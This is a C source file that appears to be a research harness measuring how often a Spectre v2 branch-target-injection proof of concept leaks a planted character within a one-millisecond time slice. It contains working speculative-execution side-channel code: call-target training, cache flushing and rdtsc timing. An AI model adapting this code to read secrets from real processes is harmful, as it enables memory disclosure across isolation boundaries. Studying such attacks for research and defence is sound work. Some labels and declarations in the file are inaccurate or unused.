/*
 *use a whole time slice to count;
 */

#define _GNU_SOURCE
#include <math.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <pthread.h>
#include <semaphore.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <sys/time.h>  

int inter_count[100001], cycles;
double score[512] = {0};

extern char stopspeculate[];

void prepare()
{
	uint16_t value = 1;
	__asm__ volatile("mov %0, %%gs" : : "r"(value));
}

uint16_t check()
{
	uint16_t value;
	__asm__ volatile("mov %%gs, %0" : "=r"(value));
	return value;
}

int multiply(int num1, int num2)
{
	return num1 * num2;
}
static void pin_cpu3()
{
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(3, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}


#define CACHE_HIT_THRESHOLD (200)
#define GAP (1024)
#define TARGET_CHAR 'C'
uint8_t channel[256 * GAP];
uint64_t *target;
char *secret = (char[]){TARGET_CHAR};

int gadget(char *addr) {
    return channel[*addr * GAP];
}

int safe_target() {
    return 42;
}

int victim(char *addr, int input) {
    int junk = 0;
    for (int i = 1; i <= 100; i++) {
        input += i;
        junk += input & i;
    }

    int result;
    __asm volatile(
        "callq *%1\n"
        "mov %%eax, %0\n"
        : "=r"(result)
        : "r"(*target)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"
    );
    return result & junk;
}

int run_spectre_v2() {
    int i, j, junk = 0;
    uint64_t start, elapsed;
    uint8_t *addr;
    char dummyChar = '$';

    for (i = 0; i < 256; i++) {
        channel[i * GAP] = 1;
    }

    *target = (uint64_t)&gadget;
    _mm_mfence();
    for (j = 50; j > 0; j--) {
        junk ^= victim(&dummyChar, 0);
    }
    _mm_mfence();

    for (i = 0; i < 256; i++) {
        _mm_clflush(&channel[i * GAP]);
    }
    _mm_mfence();

    *target = (uint64_t)&safe_target;
    _mm_mfence();
    _mm_clflush((void *)target);
    _mm_mfence();

    junk ^= victim(secret, 0);
    _mm_mfence();

    addr = &channel['C' * GAP];
    start = __rdtsc();
    junk ^= *addr;
    _mm_mfence();
    elapsed = __rdtsc() - start;

    (void)junk;
    return (elapsed <= CACHE_HIT_THRESHOLD) ? 1 : 0;
}

static long long get_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000LL + tv.tv_usec / 1000;
}

int count_tick()
{
    int total_attempts = 0;
    int success_attempts = 0;
    long long start_time, current_time;

    pin_cpu3();
    prepare();

        target = (uint64_t *)malloc(sizeof(uint64_t));
    if (!target) {
        perror("malloc failed");
        return -1;
    }

    
    start_time = get_time_ms();

   
    while (1) {
                current_time = get_time_ms();
        if (current_time - start_time >= 1) {
            break;
        }

               success_attempts += run_spectre_v2();
        total_attempts++;
    }

    free(target);

        return (total_attempts - success_attempts);
}

static char *progname;

int usage(void)
{
	printf("%s: [cycles]\n", progname);
	return 1;
}

int main(int argc, char *argv[])
{
	int ret, i;
	cpu_set_t get;
	CPU_ZERO(&get);
	progname = argv[0];
	if (argc < 2)
		return usage();

	pin_cpu3();

	if (sched_getaffinity(0, sizeof(get), &get) == -1)
	{
		printf("warning: can not get cpu affinity/n");
	}

	for (int i = 0; i < 8; i++)
	{
		if (CPU_ISSET(i, &get))
		{
			printf("this thread %d is running on processor %d\n", gettid(), i);
		}
	}

       int fail_count = count_tick();
    printf("invalidation time/ms: %d\n", fail_count);

	return 0;
}
